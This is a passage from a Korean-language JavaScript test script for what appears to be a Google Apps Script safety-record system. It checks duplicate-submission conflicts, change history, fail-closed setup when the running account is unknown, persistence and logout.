  assert(JSON.stringify(t.history).includes('기한 ' + addDays(TODAY, -1) + ' → ' + addDays(TODAY, 10)), '전이 이력에 기한 전후 값이 없습니다');
  const s = ok(api('acts.save', { act: { id: a.id, level: '보통' } }, hq), '본사 수준 변경').act;
  assert(JSON.stringify(s.history).includes('위험 수준 높음 → 보통'), '수정 이력에 수준 전후 값이 없습니다');
});

await step('(중복) 정기 양식은 같은 사업장·기간·근무조에 보고 1건 — 새 기록 제출은 CONFLICT, 임시저장·수정 제출·다른 근무조는 그대로', () => {
  const site = need(S.site1, '사업장 세션'), hq = need(S.hq, '본사 토큰');
  const date = addDays(TODAY, -20);
  const base = { form: 'F07', site: SITE1, date, period: date, shift: '주간', author: '김현장' };
  const a = ok(api('records.save', { record: Object.assign({}, base, { data: F07_DATA() }) }, site), '첫 기록 임시저장').record;
  const as = ok(api('records.submit', { record: Object.assign({}, a, { data: F07_DATA() }), acts: [] }, site), '첫 기록 제출').record;
  eq(as.status, '제출', '첫 기록 status');
  // 다른 기기에서 같은 날짜·근무조 새 기록: 임시저장은 되지만 제출은 거부
  const b = ok(api('records.save', { record: Object.assign({}, base, { data: F07_DATA() }) }, site), '둘째 기록 임시저장').record;
  assert(b.id !== a.id, '둘째 기록 번호가 첫 기록과 같습니다');
  const r1 = denied(api('records.submit', { record: Object.assign({}, b, { data: F07_DATA() }), acts: [] }, site), ['CONFLICT'], '같은 기간 둘째 기록 제출');
  assert(String(r1.error).includes(a.id) && String(r1.error).includes('그 기록을 이어서 쓰거나 수정 제출하세요'), `오류 문장에 기존 기록번호·안내가 없습니다: ${r1.error}`);
  eq(ok(api('records.get', { id: b.id }, site), '둘째 기록 조회').status, '작성중', '거부된 기록 status');
  // id 없이 바로 제출(API 직접 호출)도 거부, 새 번호가 발급되지 않음
  denied(api('records.submit', { record: Object.assign({}, base, { data: F07_DATA() }), acts: [] }, site), ['CONFLICT'], '같은 기간 새 기록 바로 제출');
  // 본사 대리 작성(H 번호)도 같은 규칙
  const r3 = denied(api('records.submit', { record: Object.assign({}, base, { author: '본사대리', data: F07_DATA() }), acts: [] }, hq), ['CONFLICT'], '본사 대리 중복 제출');
  assert(String(r3.error).includes(a.id), '본사 대리 거부 문장에 기존 기록번호가 없습니다');
  // 같은 기록 수정 제출은 그대로
  const re = ok(api('records.submit', { record: Object.assign({}, as, { data: Object.assign(F07_DATA(), { handoverNote: '수정 제출' }) }), acts: [] }, site), '같은 기록 수정 제출').record;
  eq(Number(re.rev), 2, '수정 제출 rev');
  // 다른 근무조는 다른 기간
  const n = ok(api('records.submit', { record: Object.assign({}, base, { shift: '야간', data: F07_DATA() }), acts: [] }, site), '야간조 제출').record;
  eq(n.status, '제출', '야간조 status');
  // 기존 기록이 삭제되면 다시 낼 수 있음
  ok(api('records.delete', { id: a.id, reason: '시험 정리' }, hq), '첫 기록 삭제');
  const bs = ok(api('records.submit', { record: Object.assign({}, b, { data: F07_DATA() }), acts: [] }, site), '삭제 뒤 둘째 기록 제출').record;
  eq(bs.status, '제출', '삭제 뒤 제출 status');
  // 한 기간 여러 건·수시 추가가 있는 양식은 막지 않음: F06(폭염 수시 점검)
  const f6 = { form: 'F06', site: SITE1, date: '2026-08-10', author: '김현장', data: validData('F06') };
  ok(api('records.submit', { record: Object.assign({}, f6), acts: [] }, site), 'F06 첫 점검');
  ok(api('records.submit', { record: Object.assign({}, f6), acts: [] }, site), 'F06 수시 점검 추가');
  ok(api('records.delete', { id: n.id, reason: '시험 정리' }, hq), '정리');
  ok(api('records.delete', { id: bs.id, reason: '시험 정리' }, hq), '정리');
  return `${a.id} 있을 때 ${b.id} 제출 거부`;
});

await step('(설치) 실행 계정을 못 읽으면 setup·cron 거부(실패 시 닫힘)', () => {
  const ident = { autoSave: false, formsHtml, htmlFiles: htmlFileNames(SRC_DIR), log: sink, activeUserEmail: '', effectiveUserEmail: '' };
  const c4 = vm.createContext({ console: sink });
  vm.runInContext(mockSrc, c4, { filename: 'gas-mock.js' });
  const m4 = c4.createGasMock(ident);
  Object.assign(c4, m4.globals);
  for (const f of files) vm.runInContext(f.src, c4, { filename: f.name });
  let threw = false;
  try { c4.setup({ adminPassword: 'Anon12345' }); } catch (e) { threw = true; }
  assert(threw, '신원 불명 setup 이 거부되지 않았습니다');
  assert(!m4.globals.PropertiesService.getScriptProperties().getProperty('DB_ID'), '신원 불명 setup 이 DB 를 만들었습니다');
  eq(JSON.stringify(c4.installTriggers()), '{"already":true}', '신원 불명 installTriggers');
  m4.globals.PropertiesService.getScriptProperties().setProperty('ALLOW_SETUP', '1');
  const r = c4.setup({ adminPassword: 'Owner12345', triggers: false });
  assert(r && r.dbUrl, 'ALLOW_SETUP=1 이면 setup 이 돼야 합니다');
});

await step('영속 왕복 — 저장 후 새 모의에서 로그인·조회', () => {
  assert(mock.save(), '저장 실패');
  const size = String(memStore.getItem('hds-preview-db') || '').length;
  const old = mock;
  mock = newMock(memStore);
  try {
    const d = ok(api('auth.login', { id: 'admin', password: PW }), '다시 로그인');
    const got = ok(api('records.get', { id: need(S.rec, '기록').id }, d.token), 'records.get');
    eq(got.status, '확인', 'status');
    ok(api('boot', {}, need(S.site1, '사업장 세션')), '기존 사업장 세션으로 boot');
  } finally {
    mock = old;
  }
  return `저장 ${size.toLocaleString()}자`;
});

await step('auth.logout — 세션 무효화', () => {
  ok(api('auth.logout', {}, need(S.viewer, 'viewer 세션')), 'logout');
  denied(api('boot', {}, S.viewer), ['AUTH'], '로그아웃한 세션 boot');
});

/* ---------------- 요약 ---------------- */
const failed = results.filter((r) => !r.ok && !r.optional);
const optFailed = results.filter((r) => !r.ok && r.optional);
const passed = results.filter((r) => r.ok);
console.log(`\n결과: 통과 ${passed.length} · 실패 ${failed.length}${optFailed.length ? ` · 참고 실패 ${optFailed.length}` : ''} / ${results.length}단계  (${((Date.now() - T0) / 1000).toFixed(1)}초, 메일 ${mails.length}건)`);
if (mock.warnings.length) {
  console.log(`모의 GAS 경고 ${mock.warnings.length}종(실제 GAS 에서 문제 될 수 있음):`);
  for (const w of mock.warnings.slice(0, 15)) console.log(`  - ${w.msg}${w.count > 1 ? ` (×${w.count})` : ''}`);
}
if (failed.length) {
  console.log('실패한 단계:');
  for (const f of failed) console.log(`  - ${f.name}: ${f.error.split('\n')[0]}`);
}
process.exit(failed.length ? 1 : 0);
